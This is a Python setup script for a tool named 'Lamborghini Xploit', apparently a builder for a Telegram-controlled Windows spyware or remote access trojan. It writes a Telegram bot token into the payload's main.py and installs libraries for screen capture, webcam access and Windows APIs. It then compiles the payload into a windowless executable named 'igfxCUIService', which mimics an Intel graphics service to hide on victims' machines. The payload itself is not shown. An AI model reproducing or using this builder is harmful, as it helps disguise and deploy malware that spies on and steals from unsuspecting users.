import os
import subprocess
import sys
import re
import shutil
import requests

def print_lamborghini_art():
    art = '''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠠⠤⠤⠒⠒⠒⣉⣉⣉⣉⣉⣉⣉⢉⠉⠉⠈⠉⠈⠈⠁⠁⠈⠉⠉⠈⠉⠁⠀⠀⠀⠁⠈⠉⠉⠉⠒⠒⠂⠠⠤⠄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠐⠊⠉⠉⠉⢉⠉⠩⠉⢍⣆⢲⠆⠲⢴⢢⡌⣭⢩⢏⡽⣩⠝⣭⢫⡝⡭⣍⠳⣔⢲⣒⢶⡲⢦⣤⣤⠀⠀⡤⠶⠚⠛⠛⢿⣻⣶⣶⣯⣄⣒⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠄⠊⠁⠀⠀⠀⠀⠀⠄⢂⠌⡡⢊⡾⣬⡟⠠⣷⣛⢦⡝⣦⢏⡾⣴⢣⡟⣼⢣⡞⣵⢫⡟⣼⢣⡟⣶⣹⢳⢾⠃⢀⡞⡱⣈⠱⡈⠄⡀⠳⣹⣿⣿⣿⣿⣿⣶⣤⣌⡑⠢⢤⢀⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠞⠉⠀⢀⡠⠀⠀⠀⢀⠠⡈⢆⡡⢎⠱⣸⡟⡶⣭⢷⡻⣜⣧⢻⣜⢯⣞⡵⣻⣼⡳⣯⡽⣞⣷⣫⢯⣟⣾⣵⣯⣯⠃⢀⡞⡬⠱⣄⠣⡘⠤⠐⡀⠹⣿⣿⣿⠏⠉⠙⠛⠿⣿⡶⠀⠁⠀⠙⢄⡒⢄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠂⠉⣁⠔⢋⠀⣄⢠⡖⠁⣀⠠⡐⢄⠊⣔⣑⣎⡴⢧⣳⢯⣽⣳⡽⣞⣳⢿⣼⣻⢞⣯⢾⣽⣳⢷⣻⢷⣻⣽⣶⣿⣿⣿⣿⣿⣿⠏⠀⡼⣿⣜⡱⢌⡓⠌⢆⡡⠴⠠⠸⠿⠏⡀⠀⠀⠀⠀⡰⢁⠊⠀⠀⠀⠀⠈⠒⢵⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣭⣤⣎⣱⣊⢥⣋⢖⣟⣠⢣⡤⢧⡞⣮⢻⡵⢯⣞⡽⣯⣟⡾⣧⣟⡾⣽⢯⣷⣻⣞⡿⣞⣿⣾⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⣸⢳⡹⣷⡍⢦⡙⢼⠃⠀⠀⠀⠀⠀⠀⠀⡃⠀⢀⠔⡁⠂⠀⠀⠀⠀⠀⠀⢀⣀⣣⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡤⠚⠁⠀⠀⠀⠀⠉⠉⠙⠚⠛⠺⠵⠿⠾⠷⠽⠽⠿⠾⠿⠾⠽⠷⠾⠽⠷⢯⣿⣽⣻⣞⣷⣯⣿⡿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠻⠛⠀⠀⡛⠧⣽⣹⣿⢢⣝⣾⣾⡟⠿⠿⠿⠿⠿⠋⠀⠀⠀⠈⠀⠀⠀⠀⠀⣀⣾⣧⣿⣿⣿⡀
⠀⠀⠀⠀⠀⠀⠀⢀⠔⠋⠛⠋⠌⠀⠀⠀⠀⠀⠀⠀⡀⠔⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠐⠦⡙⠋⡉⢲⣿⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿
⠀⠀⠀⠀⠀⠀⡰⠁⠀⠀⠀⡈⠀⠀⠀⠀⠀⠀⡰⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠆⠁⠀⠀⠀⠀⠀⢀⠆⠀⠀⠀⠀⠀⠈⠁⢆⡎⠰⠈⠹⠀⠀⠀⠀⠀⠀⠀⡀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⠀⠀⠀⠀⢀⣬⢦⠀⠀⠀⢠⠁⠀⠀⠀⢀⠔⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⠀⠀⠀⠀⠀⠀⢀⡠⠔⠊⠀⠀⠀⠀⠀⢀⠠⠊⠀⠀⠀⠀⠀⢠⣶⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⢀⠠⠐⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣿⣿⣿⣿
⠀⠀⠀⢠⢲⠃⣶⠡⡀⠀⡘⠀⠀⢠⠐⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⢁⡀⠀⠀⠀⣀⠄⠂⠁⠀⠀⠀⢀⣀⡤⡴⠐⠁⠀⠀⠀⠀⠀⠀⣰⢻⣿⣿⣿⢿⣧⡀⠀⠀⢀⠠⠂⠁⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⡟⣿
⠀⠀⢀⠃⢞⠀⢋⢀⣓⢄⡇⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢊⠋⠀⢀⠠⠒⠉⢀⣀⡤⠔⣶⡾⠻⠟⠠⠊⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠄⠀⣀⠐⠉⢸⣿⣿⣾⣿⣿⣿
⠀⠀⠎⠀⠀⠑⠻⠬⠑⠀⠈⠁⠐⠒⠠⠤⢀⡀⠀⠀⠀⠀⠀⠀⠤⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠤⢮⣥⣶⠸⣏⡹⢋⣠⠀⠟⡋⠔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⡟⣿⣿⣿⡟⣿⡀⠀⠀⠀⠀⠀⠀⠀⢀⠔⢩⣿⣷⣦⣀⠈⢁⣾⣿⣿⢿⣝⣯⡏
⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠂⠁⠀⠀⠀⠀⠀⢀⣶⡶⠂⠀⠀⠉⠈⠀⠀⠀⠀⠀⠀⠀⢀⡠⠊⠁⠀⠈⠛⠯⠤⠅⠖⠛⠂⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠶⠏⢹⡿⣿⣿⣿⡿⣿⣿⣟⣿⣿⡇⠀⠀⠀⠀⢀⡠⠚⡀⠌⣿⣿⣿⡿⠛⠀⠁⢸⣿⣯⢇⣿⣹⠇
⠀⢸⣿⣷⣦⣤⣀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠁⠀⠀⠐⠂⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣾⣿⣷⣾⣯⣿⠟⣩⣾⣗⠀⠀⡀⢀⡭⠐⠉⠀⠈⢁⡭⠋⠀⠀⣀⣤⣿⣿⣿⣾⣩⡟⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣷⣶⣤⣤⣄⣄⣠⣀⣄⠠⣀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣤⣤⣤⣤⣶⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⢻⣿⣯⡻⣿⣖⡿⡿⢸⡇⢀⠠⠐⠁⠀⠂⠠⢐⡊⠥⠐⠐⠚⠿⠿⠿⠿⠿⠿⠿⠛⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣽⣿⣿⣿⣿⣿⣞⣷⣞⣶⣶⣶⣶⣶⣻⣿⣿⣯⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣧⣿⣷⡿⣿⣷⣿⢇⠇⣼⠇⠁⠀⢈⡠⠄⠒⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⢿⣿⣽⣾⣿⡎⢰⡿⠄⠂⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⠪⢕⣻⠻⢿⣿⣽⣿⠿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣉⠟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⢸⣿⡟⣡⣿⣿⡿⣯⠋⣹⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠀⠀⠀⠉⠉⠑⠒⠚⠒⠫⠼⠭⠭⠯⠝⠫⣛⣝⣛⣛⣟⣻⣟⣿⣿⣿⣿⣦⣅⡫⢙⡻⢿⠿⡿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠋⠀⠀⠀⠀⣀⣀⣀⣀⣠⣼⣮⣜⣫⣙⣛⣉⣽⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠊⠁⠉⠉⠉⠉⠀⠈⠙⠻⠿⠿⠿⠿⠿⡿⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    '''
    print(art)


def convert_py_to_exe():
    script_name = "Lamborghini_Xploit//main.py"
    exe_name = 'igfxCUIService'

    # Check if the script exists
    if not os.path.exists(script_name):
        print(f"{script_name} not found in the current directory.")
        return

    # Remove previous build folders and .spec file to ensure a clean build
    for folder in ['build', 'dist']:
        if os.path.exists(folder):
            shutil.rmtree(folder)

    spec_file = f'{exe_name}.spec'
    if os.path.exists(spec_file):
        os.remove(spec_file)

    # Build the executable using PyInstaller
    command = [
        'pyinstaller',
        '--onefile',
        '--windowed',
        f'--name={exe_name}',
        script_name
    ]

    try:
        subprocess.run(command, check=True)
        print(f"{exe_name}.exe created successfully in the 'dist' folder.")
    except subprocess.CalledProcessError as e:
        print("Error during EXE conversion:", e)
        
def ask_token():
    print("")
    token_path = input("Please enter your Telegram bot token path: ").strip()
    if not token_path:
        print("Token path cannot be empty. Please try again.")
        return ask_token()
    
    main_file_path = "Lamborghini_Xploit//main.py"
    
    try:
        with open(main_file_path, 'r', encoding='utf-8') as f:
            main_content = f.read()
        
        # Use regex to replace the TOKEN_URL regardless of its current value
        updated_content = re.sub(r'TOKEN_URL = ".*?"', f'TOKEN_URL = "{token_path}"', main_content)
        
        with open(main_file_path, 'w', encoding='utf-8') as f:
            f.write(updated_content)
        
        print(f"Token updated successfully in {main_file_path}")
        return token_path  # Return the token for further use if needed
    except FileNotFoundError:
        print(f"Error: {main_file_path} not found.")
        return None
    except Exception as e:
        print(f"Error updating token in {main_file_path}: {e}")
        return None

def install_dependencies():
    dependencies = [
        "requests",
        "pyautogui",
        "opencv-python",
        "pycryptodome",
        "pywin32",
        "pyTelegramBotAPI",
        "auto-py-to-exe"
    ]
    
    for package in dependencies:
        try:
            __import__(package)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

if __name__ == "__main__":
    
    print_lamborghini_art()

    RED = "\033[91m"
    GREEN = "\033[92m"
    RESET = "\033[0m"

    print("\n")
    print(GREEN + "Welcome to Lamborghini Xploit Setup!" + RESET)
    print(RED + "+" + "-" * 50 + "+" + RESET)
    print(RED + "|{:^50}|".format("Initializing Lamborghini Xploit") + RESET)
    print(RED + "|{:^50}|".format("By Ishinder Singh") + RESET)
    print(RED + "+" + "-" * 50 + "+" + RESET)
    print("| This script will set up the Lamborghini Xploit   |")
    print("| for optimal performance.                         |")
    print("| Make sure you have the necessary permissions to  |")
    print("| proceed.                                         |")
    print(RED + "+" + "-" * 50 + "+" + RESET)
    print(RED + "|{:^50}|".format("Warning: Team IRA is not") + RESET)
    print(RED + "|{:^50}|".format("responsible for any misuse.") + RESET)
    print(RED + "+" + "-" * 50 + "+" + RESET)
    print("\n")
    
    while True:
        print(GREEN + "- > To Change Token Enter          1" + RESET)
        print(GREEN + "- > To Install Libraries Enter     2" + RESET) 
        print(GREEN + "- > To Convert Py to Exe Enter     3" + RESET)
        print(GREEN + "- > To Exit Enter                  4" + RESET)
        choice = input("Enter your choice: ").strip()
        if choice == '1':
            print(GREEN + "Changing Telegram Bot Token..." + RESET)
            ask_token()
        elif choice == '2':
            print(GREEN + "Installing Dependencies..." + RESET)
            install_dependencies()
        elif choice == '3':
            print(GREEN + "Converting main.py to igfxCUIService.exe..." + RESET)
            convert_py_to_exe()
        elif choice == '4':
            print(GREEN + "Exiting setup." + RESET)
            sys.exit(0)
        else:
            print(RED + "Invalid choice. Please try again." + RESET)
        print(GREEN + "Setup completed successfully!" + RESET)
        print("\n")